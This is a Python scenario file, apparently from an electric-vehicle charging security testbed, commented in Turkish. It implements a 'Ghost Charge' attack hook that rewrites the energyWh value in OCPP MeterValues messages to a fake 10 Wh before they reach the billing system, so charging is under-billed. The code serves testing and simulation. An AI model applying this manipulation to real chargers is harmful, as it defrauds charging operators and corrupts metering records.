"""
scenario_03_hayalet_sarj/hooks.py
Hayalet Şarj (Ghost Charge) Saldırı Senaryosu

Bu senaryo, şarj noktasının CSMS'e gönderdiği MeterValues mesajlarını
manipüle ederek gerçek tüketimden çok daha düşük değerler raporlar.

Saldırı Mekanizması:
- Gerçek enerji tüketimi ölçülür
- MeterValues gönderilmeden önce pre_ocpp() hook'u devreye girer
- energyWh değeri sahte (çok düşük) bir değerle değiştirilir
- CSMS sahte değeri alır ve düşük fatura keser
- Saldırgan ücretsiz/ucuz şarj yapmış olur
"""

from infra.scenario_base import ScenarioHooks


class GhostChargeScenario(ScenarioHooks):
    """
    Hayalet Şarj Saldırısı
    
    MeterValues mesajlarındaki enerji değerlerini manipüle ederek
    CSMS'e gerçek tüketimin çok altında değerler raporlar.
    """

    def __init__(self):
        super().__init__()
        self.fake_energy_wh = 10  # Sahte enerji değeri (Wh)
        self.attack_active = True  # Saldırı aktif mi?
        self.original_values = []  # Orijinal değerleri kaydet

    def pre_ocpp(self, action, payload):
        """
        OCPP mesajı gönderilmeden önce çağrılır.
        MeterValues mesajlarını manipüle eder.
        """
        if action == "MeterValues" and self.attack_active:
            original_energy = payload.get("energyWh", 0)
            
            # Orijinal değeri kaydet
            self.original_values.append(original_energy)
            
            # Sahte değer ile değiştir
            payload["energyWh"] = self.fake_energy_wh
            
            self.log(
                f"[GHOST ATTACK] MeterValues manipüle edildi: "
                f"Gerçek={original_energy} Wh → Sahte={self.fake_energy_wh} Wh"
            )
            
        return action, payload

    def post_ocpp(self, action, payload, reply):
        """
        OCPP cevabı alındıktan sonra çağrılır.
        Saldırı durumunu loglar.
        """
        if action == "MeterValues" and self.attack_active:
            self.log(f"[GHOST ATTACK] CSMS sahte değeri kabul etti: {reply}")
            
        return reply

    def pre_can(self, can_frame):
        """
        CAN frame gönderilmeden önce çağrılır.
        Ghost charge saldırısında CAN manipülasyonu yapılmaz.
        """
        return can_frame

    def post_can(self, can_frame):
        """
        CAN frame gönderildikten sonra çağrılır.
        Loglama için kullanılabilir.
        """
        if self.attack_active:
            self.log(f"[GHOST ATTACK] CAN frame gönderildi: {can_frame}")
